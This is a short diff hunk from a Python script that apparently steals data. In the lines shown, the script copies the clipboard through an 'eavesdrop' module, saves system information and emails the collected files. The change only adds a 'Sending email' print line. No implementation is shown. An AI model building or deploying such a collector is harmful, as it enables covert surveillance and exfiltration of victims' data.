@@ -25,7 +25,7 @@ if __name__ == '__main__':
         eavesdrop.copy_clipboard()
         print("Starting SystemInfo")
         SystemInfoProvider().fetch_and_save_computer_information(file_path)
-
+        print("Sending email")
         email_service = EmailService()
         email_service.send_email(filenames)
 
